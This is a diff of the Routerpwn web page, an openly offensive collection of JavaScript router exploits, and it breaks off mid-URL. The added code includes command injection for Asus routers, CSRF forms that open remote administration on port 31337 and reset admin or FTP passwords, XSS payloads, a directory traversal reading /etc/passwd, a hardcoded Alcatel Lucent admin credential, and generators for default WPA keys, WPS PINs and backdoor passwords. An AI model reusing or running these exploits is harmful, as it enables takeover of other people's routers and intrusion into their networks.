@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.11.161</title>
+		<title>Routerpwn 1.13.189</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -65,7 +65,6 @@
 	#contenedor {
 		display: block;
 		background: #000;
-		width: 70%;
 		margin-left: auto;
 		margin-right: auto;
 		text-align: center;
@@ -75,10 +74,14 @@
 		color: #FFF;
 	}
 
+h3 {
+	font-size: 20pt;
+}
+
 	#marcas {
--moz-column-count:2; /* Firefox */
--webkit-column-count:2; /* Safari and Chrome */
-column-count:2;
+-moz-column-count:4; /* Firefox */
+-webkit-column-count:4; /* Safari and Chrome */
+column-count:4;
 		display: block;
 		background-image: url("bg.jpg");
 		border-color: #FFF;
@@ -86,14 +89,11 @@ column-count:2;
 		border-style: solid;
 	}
 
-	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#belkin,#cisco,#comtrend,#DDWRT,#DLink,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel {
+	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#asus,#alcatellucent,#belkin,#cisco,#comtrend,#DDWRT,#DLink,#zoom,#smc,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel {
 		background-image: url("bg.jpg");
 	}
 
 	#generadores {
-		margin-left: auto;
-		margin-right: auto;
-		text-align: center;
 		background-image: url("bg.jpg");
 	}
 
@@ -103,6 +103,7 @@ column-count:2;
 		text-align: left;
 		margin-left: auto;
 		margin-right: auto;
+		font-size: 16pt;
 	}
 
 	footer {
@@ -133,8 +134,8 @@ column-count:2;
 
 	#logo {
 		background: url("logo.gif") no-repeat center, black;
-		background-size: 400px 400px;
-		height: 350px;
+		background-size: 200px 200px;
+		height: 180px;
 		margin-left: auto;
 		margin-right: auto;
 	}
@@ -153,7 +154,7 @@ column-count:2;
 
 <link rel=stylesheet href="mobile.css" type="text/css">
 
-<!-- routerpwn scripts are all in one page so you can store a single .html for offline exploitation -->
+<!-- routerpwn scripts are mostly in one page so you can store a single .html for offline exploitation -->
 <script>
 
 function img(query) {
@@ -221,6 +222,26 @@ function huapppr(){
 	alert("Continue");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/wanfun.js";
+	}
+}
+
+function rtn66uexe(){
+	ip=prompt("IP:");
+	cmd=prompt("Command:");
+	img1.src="http://"+ip+"/apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&next_host=192.168.1.1&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd="+cmd+"&firmver=3.0.0.4&cmdMethod=ping&destIP=www.google.com&pingCNT=5";
+	alert("Continue");
+	if (ip==null || ip==""){}else{
+		document.location="http://"+ip+"/cmdRet_check.htm";
+	}
+}
+
+function N56Uexe(){
+	ip=prompt("IP:");
+	cmd=prompt("Command:");
+	img1.src="http://"+ip+"/apply.cgi?current_page=Main_AdmStatus_Content.asp&next_page=Main_AdmStatus_Content.asp&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd="+cmd+"&action=Refresh";
+	alert("Continue");
+	if (ip==null || ip==""){}else{
+		document.location="http://"+ip+"/Main_AdmStatus_Content.asp";
 	}
 }
 
@@ -621,6 +642,22 @@ function DSL2640Br() {
 	}
 }
 
+function ff2640U(){
+	ip=prompt("IP:");
+	document.f2640U.action="http://"+ip+"/wizisp.cgi?quick=1&sntpRefresh=0&wizTmpSntpEnable=0&wizTmpDST=0";
+	if (ip==null || ip==""){}else{
+		document.f2640U.submit();
+	}
+}
+
+function  ff1500WG(){
+	ip=prompt("IP:");
+	document.f1500WG.action="http://"+ip+"/m_atminttemp11.stm";
+	if (ip==null || ip==""){}else{
+		document.f1500WG.submit();
+	}
+}
+
 function singwiredosr() {
 	ip=prompt("IP:");
 	document.singwiredos.action="http://"+ip+"/xslt";
@@ -894,6 +931,13 @@ String.prototype.toHex = function() {
         return "%"+parseInt(s.charCodeAt()).toString(16);
     });
 };
+
+function trend23pwn(){
+document.t231.submit();
+setTimeout(function() {document.t232.submit();},3000);
+setTimeout(function() {document.t233.submit();},6000);
+}
+
 function netdos() {
 	ip=prompt("IP:");
 	document.netdos.action="http://"+ip+"/cgi-bin/firmwarecfg";
@@ -976,6 +1020,18 @@ function sagemtelnet(){
         alert("Telnet root password: "+password.join(""))
 }
 
+function sagemcable(){
+	ssid=prompt("SSID: ");
+	ssid=ssid.substring(3);
+	var password = new Array();
+        password[0]= "2ce412ea"+ssid;
+        password[1]= "2ce412eb"+ssid;
+        password[2]= "2ce412ec"+ssid;
+        password[3]= "2ce412ed"+ssid;
+
+        alert("Possible wireless keys: "+"\n"+password[0]+"\n"+password[1]+"\n"+password[2]+"\n"+password[3])
+}
+
 
 function easyboxwpa(){
 	mac=prompt("MAC: ");
@@ -1049,6 +1105,15 @@ function post(url, fields) {
 	var p = document.createElement('form');
 	p.action = url;
 	p.innerHTML = fields;
+//	p.target = 'iframe';
+	p.method = 'post';
+	document.body.appendChild(p);
+	p.submit();
+}
+function posts(url, fields) {
+	var p = document.createElement('form');
+	p.action = url;
+	p.innerHTML = fields;
 	p.target = 'iframe';
 	p.method = 'post';
 	document.body.appendChild(p);
@@ -1061,10 +1126,10 @@ function changeDNS(server) {
 		fields += '<input type="hidden" name="resolver:settings/nameserver1" value="'+server+'">';
 		fields += '<input type="hidden" name="resolver:settings/nameserver2" value="'+server+'">';
 		fields += '<input type="hidden" name="dproxy:settings/state" value="2">';
-		post('http://192.168.1.1/cgi-bin/webcm',fields);
+		posts('http://192.168.1.1/cgi-bin/webcm',fields);
 	}, 2000);
 	setTimeout(function() {
-		post('http://192.168.1.1/cgi-bin/web.....;<input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm">');
+		posts('http://192.168.1.1/cgi-bin/web.....;<input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm">');
 	},5000);
 }
 /* end pdp */
@@ -1145,6 +1210,71 @@ function comtrendpassr() {
 	document.comtrendpass.action="http://"+ip;
 	if (ip==null || ip==""){}else{
 		document.comtrendpass.submit();
+	}
+}
+function ea2700passr() {
+	ip=prompt("IP:");
+	xss=prompt("New password:");
+	document.ea2700pass.http_passwd.value=xss;
+	document.ea2700pass.http_passwdConfirm.value=xss;
+	document.ea2700pass.action="http://"+ip;
+	if (ip==null || ip==""){}else{
+		document.ea2700pass.submit();
+	}
+}
+
+function trendCSRF() {
+	ip=prompt("IP:");
+	document.trendCSRF.action="http://"+ip+"/setSysAdm.cgi";
+	if (ip==null || ip==""){}else{
+		document.trendCSRF.submit();
+	}
+}
+function trendCSRF2() {
+	ip=prompt("IP:");
+	document.trendCSRF2.action="http://"+ip+"/uapply.cgi";
+	if (ip==null || ip==""){}else{
+		document.trendCSRF2.submit();
+	}
+}
+
+
+function ea2700xssr() {
+	ip=prompt("IP:");
+	xss=prompt("XSS:");
+	document.ea2700xss.submit_button.value=xss;
+	document.ea2700xss.action="http://"+ip;
+	if (ip==null || ip==""){}else{
+		document.ea2700xss.submit();
+	}
+}
+
+function CSRFxssPWN() {
+	ip=prompt("IP:");
+	xss=prompt("XSS:");
+	document.CSRFxssPWN.submit_button.value=xss;
+	document.CSRFxssPWN.action="http://"+ip;
+	if (ip==null || ip==""){}else{
+		document.CSRFxssPWN.submit();
+	}
+}
+
+function ea2700pathr() {
+	ip=prompt("IP:");
+	xss=prompt("FILE:");
+	document.ea2700path.next_page.value=xss;
+	document.ea2700path.action="http://"+ip;
+	if (ip==null || ip==""){}else{
+		document.ea2700path.submit();
+	}
+}
+
+
+function N56Ur() {
+	ip=prompt("IP:");
+	document.N56U.action="http://"+ip+"/start_apply.htm";
+	if (ip==null || ip==""){}else{
+		document.N56U.submit();
 	}
 }
 
@@ -1307,10 +1437,239 @@ function GenArrisPasswords(startdate, enddate) {
     }
   }
 }
+
+
+
+function DIR865L(ip){
+	ip = ip || "192.168.0.1";
+	loca = prompt("Path to XML files containing PHP code for execution\n../../tmp/storage/<sharename>/FILE")
+	document.location="http://"+ip+"/router_info.xml?section="+loca;
+}
+
+
+function WR1043ND(ip){
+	ip = ip || "192.168.0.1";
+	alert("Making Root FS Accessible to FTP");
+	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?displayName=RootTraversal&shareEntire=%2F&Save=Save&selPage=0&Page=1&subpage=2";
+	alert("Enabling FTP on the WAN Interface");
+	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?internetA=1&service_port=21&save=Save";
+	alert("Enabling Remote Management");
+	img1.src="http://"+ip+"/userRpm/ManageControlRpm.htm?port=80&ip=255.255.255.255&Save=Save";
+	alert("Change FTP Admin User Password");
+	img1.src="http://"+ip+"/userRpm/NasUserAdvRpm.htm?nas_admin_pwd=ISE&nas_admin_confirm_pwd=ISE&nas_admin_authority=1&nas_admin_ftp=1&Modify=0&Save=Save";
+	alert("Enabling FTP Server");
+	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?startFtp=1";
+}
+
+function N900_csrf(ip){
+	ip = ip || "192.168.2.1";
+form = '<input name="page" value="util_system"/>\
+<input name="sHr" value="00"/>\
+<input name="Mm" value="00"/>\
+<input name="eHr" value="00"/>\
+<input name="eMm" value="00"/>\
+<input name="RemoteIP" value="..."/>\
+<input name="passwd_md5" value="5f4dcc3b5aa765d61d8327deb882cf99"/>\
+<input name="do_save_passwd_md5" value="1"/>\
+<input name="login_timeout" value="99"/>\
+<input name="EnableRgmt" value="1"/>\
+<input name="checkremote" value="1"/>\
+<input name="http_wanport" value="31337"/>\
+<input name="EnableUPNP" value="1"/>\
+<input name="version_eb" value="0"/>';
+	post('http://' + ip + '/util_system.html', form);
+}
+
+function F5D8236_4v2_csrf_admin(ip){
+	ip = ip || "192.168.2.1";
+form = '<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
+<input type="hidden" name="remote_mgmt_port" value="31337"/>\
+<input type="hidden" name="allow_remote_ip" value="0">';
+	post('http://' + ip + '/cgi bin/system_setting.exe', form);
+}
+
+
+function N300_csrf_admin(ip){
+	ip = ip || "192.168.2.1";
+form = '<input type="hidden" name="location_page" value="system.stm"/>\
+<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
+<input type="hidden" name="http_passwd" value=""/>\
+<input type="hidden" name="fw_disable" value="0"/>\
+<input type="hidden" name="EnableRgmt" value="on"/>\
+<input type="hidden" name="allow_remote_ip" value="0"/>\
+<input type="hidden" name="http_wanport" value="31337"/>\
+<input type="hidden" name="arc_action" value="Apply+Changes"/>';
+	post('http://' + ip + '/apply.cgi', form);
+}
+
+function httpGet(url)
+{
+            var http = new XMLHttpRequest(); 
+            http.open("GET", url, true);             
+            http.onreadystatechange = function() {};
+            http.send(null);
+}
+
+//Zoom X4 and X5 ADSL Modem and Router - Change Administrator Password - js by sinnet3000
+function zoomX_changeadminpass(ip)
+{
+    ip = ip || "10.0.0.2";
+    var admin= prompt("New password:");
+    // Ugly hack to manage both firmware cases
+    url_firmware_2 = 'http://' + ip + '/hag/emweb/PopOutUserAdd.htm?id=70&user_id="newintermediateaccount"&priv=v2&pass1="' + admin + '"&pass2="' + admin + '"&cmdSubmit=Save+Changes';
+    url_firmware_3 = 'http://' + ip + '/hag/emweb/PopOutUserAdd.htm?id=70&Zadv=1&ex_param1=adminuser_id="newadminaccount"&priv=v1&pass1="' + admin + '"&pass2="' +admin + '"&cmdSubmit=Save+Changes';
+    httpGet(url_firmware_2);
+    httpGet(url_firmware_3);
+}
+
+
+
+// Alcatel Lucent I-240W-Q Authentication Bypass - js by sinnet3000
+function i230w_auth(ip)
+{
+	ip = ip || "192.168.1.254";
+	form = '<input value="index" name="XWebPageName" />\
+	<input value="telecomadmin" name="username" />\
+	<input value="nE7jA%5m" name="password" />';
+	post('http://' + ip + '/GponForm/LoginForm', form);
+}
+
+function N900_xss_psk(ip)
+{
+	ip = ip || "192.168.2.1";
+	form = '<input name="page" value="wl_guest">\
+<input name="radio" value="1">\
+<input name="wl_guest_mode" value="1">\
+<input name="ssid" value="belkin.c86.guests">\
+<input name="guest_psk" value="<img+src%3D"42"+onerror%3D"alert(42)">"';
+	post('http://' + ip + '	/wl_guest.html', form);
+}
+
+function N900_xss_ssid(ip)
+{
+	ip = ip || "192.168.2.1";
+xss = prompt("XSS:")
+	form = '<input name="page" value="wl_channel">\
+<input name="wchan1" value="0">\
+<input name="ssid1" value="belkin.c86">\
+<input name="wbr1" value="9">\
+<input name="wl_nbw_cap1" value="0">\
+<input name="hidessid1" value="1">\
+<input name="protectmode1" value="0">\
+<input name="wmmenable1" value="1">\
+<input name="burstMode1" value="1">\
+<input name="wchan2" value="0">\
+<input name="ssid2" value="';
+form += xss;
+form += '">\
+<input name="wbr2" value="8">\
+<input name="wl_nbw_cap2" value="1">\
+<input name="hidessid2" value="1">\
+<input name="protectmode2" value="0">\
+<input name="wmmenable2" value="1">\
+<input name="burstMode2" value="1">';
+	post('http://' + ip + '	/wl_chanel.html', form);
+}
+
+// 2wire 4011G and 5012NV - Directory Traversal js by sinnet3000
+function twowire4011g5012nv_dirtraversal(ip)
+{
+    ip = ip || "192.168.1.254";
+    pathfile = prompt("Path :\n(Ex: /etc/passwd, /etc/serialno)");
+    resource = '/pages/C_4_0.asp/../../..' + pathfile;
+    form = '<input value="' + resource + '"name="__ENH_SHOW_REDIRECT_PATH__" />\
+    <input value="Acceder" name="__ENH_SUBMIT_VALUE_SHOW__" />\
+    <input value="" name="__ENH_SUBMIT_VALUE_SHOW__" />\
+    <input value="tech" name="username" />';
+    post('http://' + ip + '/goform/enhAuthHandler', form);
+}
+
+//ARRIS DG860A WPS PIN Generator by Justin Oberdorf - js by hkm
+function ComputeChecksum(s){
+	accum = 0
+	s *= 10
+	accum += 3 * ((parseInt(s / 10000000)) % 10)
+	accum += 1 * ((parseInt(s / 1000000)) % 10)
+	accum += 3 * ((parseInt(s / 100000)) % 10)
+	accum += 1 * ((parseInt(s / 10000)) % 10)
+	accum += 3 * ((parseInt(s / 1000)) % 10)
+	accum += 1 * ((parseInt(s / 100)) % 10)
+	accum += 3 * ((parseInt(s / 10)) % 10)
+
+	digit = (accum % 10)
+	return (10 - digit) % 10
+}
+
+function F(n)
+{
+if (n==1 || n==2 || n==0){
+        return 1;
+     } else{
+      return F(n-1) + F(n-2);
+    }
+}
+
+function FibGen(num){
+	return F(num);
+}
+function DG860A_wps_gen(strMac){
+
+	fibnum = new Array(6)
+	fibsum=0;
+	seed=16
+	count=1
+	offset=0
+	counter=0
+
+q=prompt("MAC:");
+q = q.replace(/:/g,'');
+a=0
+arrayMacs = new Array();
+var tmp = new Array();
+
+for (c=0;c<13;c+=2) {
+   arrayMacs[a]=parseInt(q.charAt(c)+q.charAt(c+1), 16);
+   tmp[a]=parseInt(q.charAt(c)+q.charAt(c+1), 16);
+a=a+1
+}
+
+	for (i=0;i<6;i++){
+		if (tmp[i] > 30) {
+			while (tmp[i] > 31){
+				tmp[i] -= 16
+				counter += 1
+			}
+		}
+		if (counter == 0){
+			if (tmp[i] < 3) {
+				tmp[i] = tmp[0]+tmp[1]+tmp[2]+tmp[3]+tmp[4]+tmp[5]-tmp[i]
+				if (tmp[i] > 0xff){
+					tmp[i] = tmp[i] & 0xff
+				}
+				tmp[i] = (tmp[i]%28) + 3
+			}
+
+			fibnum[i] = FibGen(tmp[i])
+		}else{
+			fibnum[i] = FibGen(tmp[i])+FibGen(counter)
+		}
+		counter = 0
+	}
+
+    for (i=0;i<6;i++){
+
+		fibsum += (fibnum[i]*FibGen(i+seed))+arrayMacs[i]
+	}
+	fibsum = fibsum%10000000
+	checksum = ComputeChecksum(fibsum)
+	fibsum = (fibsum*10) + checksum
+	alert("WPS: "+String(fibsum))
+}
+
+
 </script>
 	</head>
 	<body>
-	<a href="https://play.google.com/store/apps/details?id=websec.routerpwn"><DIV id="market"><img src="googleplay.png"/></a></DIV>
 	<a href="https://twitter.com/Routerpwn"><DIV id="market"><img src="twit.png"/></a></DIV></a>
 	<section id="contenedor">
 		<a href="http://www.routerpwn.com/info.html"><div id="logo"></div></a>
@@ -1318,10 +1677,12 @@ function GenArrisPasswords(startdate, enddate) {
 			<div><h2><a href="#wire">2Wire</a></h2></div>
 			<div><h2><a href="#com">3Com</a></h2></div>
 			<div><h2><a href="#arris">Arris</a></h2></div>
+			<div><h2><a href="#alcatellucent">Alcatel Lucent</a></h2></div>
 			<div><h2><a href="#alpha">Alpha</a></h2></div>
 			<div><h2><a href="#asmax">Asmax</a></h2></div>
+			<div><h2><a href="#asus">Asus</a></h2></div>
 			<div><h2><a href="#belkin">Belkin</a></h2></div>
-			<div><h2><a href="#cisco">Cisco</a></h2></div>
+			<div><h2><a href="#cisco">Cisco Linksys</a></h2></div>
 			<div><h2><a href="#comtrend">Comtrend</a></h2></div>
 			<div><h2><a href="#DDWRT">DD-Wrt</a></h2></div>
 			<div><h2><a href="#DLink">DLink</a></h2></div>
@@ -1338,6 +1699,7 @@ function GenArrisPasswords(startdate, enddate) {
 			<div><h2><a href="#seagate">Seagate</a></h2></div>
 			<div><h2><a href="#siemens">Siemens</a></h2></div>
 			<div><h2><a href="#sitecom">Sitecom</a></h2></div>
+			<div><h2><a href="#smc">SMC</a></h2></div>
 			<div><h2><a href="#thomson">Thomson</a></h2></div>
 			<div><h2><a href="#tplink">TP-Link</a></h2></div>
 			<div><h2><a href="#trendnet">TRENDnet</a></h2></div>
@@ -1345,19 +1707,22 @@ function GenArrisPasswords(startdate, enddate) {
 			<div><h2><a href="#utstarcom">UTStarcom</a></h2></div>
 			<div><h2><a href="#xavi">Xavi</a></h2></div>
 			<div><h2><a href="#zyxel">ZyXEL</a></h2></div>
+			<div><h2><a href="#zoom">Zoom</a></h2></div>
 		</section><br><br><br><br>
 <section id="generadores">
-<article><div><h3><a href="javascript:ruggedcom();">RuggedCom "factory" Backdoor Password Generator</a></h3></div></article>
-<article><div><h3><a href="javascript:sagemtelnet();">Sagem Fast Telnet Root Password Generator</a></h3></div></article>
 <article><div><h3><a href="javascript:document.location='http://50.57.229.26/a1wpa.php?ssid='+prompt('MAC:');">A1/Telekom PRG EAV4202N Default WPA Key Generator</a></h3></div></article>
-<article><div><h3><a href="javascript:document.location='http://50.57.229.26/pirelli_wpa.php?ssid='+prompt('SSID:');">Discus DRG A225 WiFi router Default WPA2-PSK Key Generator</a></h3></div></article>
-<article><div><h3><a href="javascript:document.location='http://50.57.229.26/bbkeys.php?ssid='+prompt('SSID:');">Thomson BBox BBKeys TG787 Default Wireless Key Generator</a></h3></div></article>
-<article><div><h3><a href="javascript:easyboxwpa()">EasyBox Standard WPA2 Key Generator</a></h3></div></article>
-<article><div><h3><a href="http://50.57.229.26/zynos.php">ZynOS (Huawei) Configuration Decompressor</a></h3></div></article>
-<article><div><h3><a href="javascript:mac2wepkey()">Huawei HG5XX Mac2wepkey Default Wireless Key Generator</a></h3></div></article>
-<article><div><h3><a href="javascript:document.location='http://50.57.229.26/stkeys.php?ssid='+prompt('SSID:');">Thomson SpeedTouch STKeys 585v6 Default Wireless Key Generator</a></h3></div></article>
-<article><div><h3><a href="javascript:eval(acctongen())">Backdoor password in Accton-based switches (3com, Dell, SMC, Foundry and EdgeCore)</a></h3></div></article>
+<article><div><h3><a href="javascript:eval(acctongen())">Accton-based switches (3com, Dell, SMC, Foundry and EdgeCore) Backdoor password Generator</a></h3></div></article>
 <article><div><h3><a href="javascript:GenArrisPasswords()">Arris Password of The Day Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:DG860A_wps_gen()">Arris DG860A WPS PIN Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:document.location='http://50.57.229.26/pirelli_wpa.php?ssid='+prompt('SSID:');">Discus DRG A225 WiFi router Default WPA2-PSK Key Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:easyboxwpa()">EasyBox Standard WPA2 Key Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:mac2wepkey()">Huawei HG5XX Mac2wepkey Default Wireless Key Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:sagemtelnet();">Sagem Fast Telnet Root Password Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:sagemcable();">Sagemcom f@st 3184 default wireless password (Cabovisão)</a></h3></div></article>
+<article><div><h3><a href="javascript:ruggedcom();">RuggedCom "factory" Backdoor Password Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:document.location='http://50.57.229.26/bbkeys.php?ssid='+prompt('SSID:');">Thomson BBox BBKeys TG787 Default Wireless Key Generator</a></h3></div></article>
+<article><div><h3><a href="javascript:document.location='http://50.57.229.26/stkeys.php?ssid='+prompt('SSID:');">Thomson SpeedTouch STKeys 585v6 Default Wireless Key Generator</a></h3></div></article>
+<article><div><h3><a href="http://50.57.229.26/zynos.php">ZynOS (Huawei) Configuration Decompressor</a></h3></div></article>
 </section>
 <section id="herramientas">
 	<h3><a href="javascript:macfind()">MAC to Vendor Lookup and Search (mac_find)</a></h3>
@@ -1376,20 +1741,27 @@ function GenArrisPasswords(startdate, enddate) {
 </form>
 <section id="wire">
 <h2>2Wire</h2>
-<h3><a href="javascript:img('1700HG')">1700HG</a>, <a href="javascript:img('1701HG')">1701HG</a>, <a href="javascript:img('1800HW')">1800HW</a>, <a href="javascript:img('2071HG')">2071HG</a>, <a href="javascript:img('2700HG')">2700HG</a>, <a href="javascript:img('2701HG-T')">2701HG-T</a>, <a href="javascript:img('2701HGV-E')">2701HGV-E</a>, <a href="javascript:img('2700HGV-2')">2700HGV-2</a>, <a href="javascript:img('3800HGV-B')">3800HGV-B</a></h3>
+<h3><a href="javascript:img('4011G')">4011G</a>, <a href="javascript:img('5012NV')">5012NV</a>, <a href="javascript:img('1700HG')">1700HG</a>, <a href="javascript:img('1701HG')">1701HG</a>, <a href="javascript:img('1800HW')">1800HW</a>, <a href="javascript:img('2071HG')">2071HG</a>, <a href="javascript:img('2700HG')">2700HG</a>, <a href="javascript:img('2701HG-T')">2701HG-T</a>, <a href="javascript:img('2701HGV-E')">2701HGV-E</a>, <a href="javascript:img('2700HGV-2')">2700HGV-2</a>, <a href="javascript:img('3800HGV-B')">3800HGV-B</a></h3>
+
+<article>
+	<div>12/31/12</div>
+	<div><a href="https://www.underground.org.mx/index.php?topic=28616.0">[+]</a></div>
+	<div><a href="javascript:twowire4011g5012nv_dirtraversal()">4011G y 5012NV directory traversal</a></div>
+	<div><a href="javascript:twowire4011g5012nv_dirtraversal(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>03/02/12</div>
 	<div><a href="https://www.underground.org.mx/index.php?topic=22175.msg141787#msg141787">[+]</a></div>
 	<div><a href="http://gateway.2wire.net/xslt?PAGE=BJ_STATUS">2701HG remote administration password disclosure</a></div>
-	<div><a href="javascript:setip('/xslt?PAGE=BJ_STATUS')">[IP]</a></div>
+	<div><a href="javascript:setip('/xslt?PAGE=BJ_STATUS')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/01/11</div>
 	<div><a href="http://blog.szechuen.com/cve-2011-3682">[+]</a></div>
 	<div><a href="javascript:singwiredos.submit()">2701HGV-E 2700HGV-2 2700HG singtel default mdc password DoS</a></div>
-	<div><a href="javascript:singwiredosr()">[IP]</a></div>
+	<div><a href="javascript:singwiredosr()">[SET IP]</a></div>
 </article>
 
 <article>
@@ -1402,63 +1774,63 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>10/29/09</div>
 	<div><a href="http://www.hakim.ws/2wire/1-003.full.txt">[+]</a></div>
 	<div><a href="https://home:50001/xslt?page=%0d%0a">17x 18x 20x 27x CRLF denial of service remote MDC</a></div>
-	<div><a href="javascript:wirecrlfr()">[IP]</a></div>
+	<div><a href="javascript:wirecrlfr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>10/29/09</div>
 	<div><a href="http://www.hakim.ws/2wire/1-003.full.txt">[+]</a></div>
 	<div><a href="http://home/xslt?page=%0d%0a">17x 18x 20x 27x CRLF denial of service</a></div>
-	<div><a href="javascript:wirecrlf()">[IP]</a></div>
+	<div><a href="javascript:wirecrlf()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/18/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/9459">[+]</a></div>
 	<div><a href="http://gateway.2wire.net/setup/password_required.html">17x 18x 20x 27x password_required.html authentication bypass</a></div>
-	<div><a href="javascript:setip('/setup/password_required.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/setup/password_required.html')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/11/09</div>
 	<div><a href="http://www.hakim.ws/2wire/2wire_CD35_AuthBypass_PassReset_esp.txt">[+]</a></div>
 	<div><a href="http://home/xslt?page=CD35_SETUP_01">17x 18x 20x 27x CD35_SETUP_01 authentication bypass</a></div>
-	<div><a href="javascript:setip('/xslt?page=CD35_SETUP_01')">[IP]</a></div>
+	<div><a href="javascript:setip('/xslt?page=CD35_SETUP_01')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/11/09</div>
 	<div><a href="http://www.hakim.ws/2wire/2wire_CD35_AuthBypass_PassReset_esp.txt">[+]</a></div>
 	<div><a href="http://home/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm">17x 18x 20x 27x CD35_SETUP_01 password reset</a></div>
-	<div><a href="javascript:setip('/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkm